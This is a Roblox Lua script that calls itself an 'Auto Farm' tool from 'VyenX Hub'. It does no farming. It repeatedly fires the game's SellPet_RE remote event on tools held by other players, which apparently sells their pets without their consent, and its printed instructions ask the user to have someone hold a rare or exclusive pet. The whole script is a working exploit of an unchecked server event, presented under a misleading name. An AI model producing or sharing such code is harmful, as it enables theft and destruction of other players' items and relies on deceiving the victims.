-- VyenX Hub - Auto Farm
print("VyenX Hub loaded!")
print("Auto Farm starting...")

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local plr = Players.LocalPlayer

-- Start auto farming
spawn(function()
    while true do
        for _, v in ipairs(Players:GetChildren()) do
            if v == plr then continue end

            if v.Character then
                local tool = v.Character:FindFirstChildOfClass("Tool")
                if tool then
                    ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("SellPet_RE"):FireServer(tool)
                end
            end
        end
        task.wait(0.3) -- 0.3 seconds delay
    end
end)

print("Auto Farm running! Delay: 0.3s")
print("Instructions: Have someone holding a Porcupine, Mole, or Exclusive Pet in their hands") 
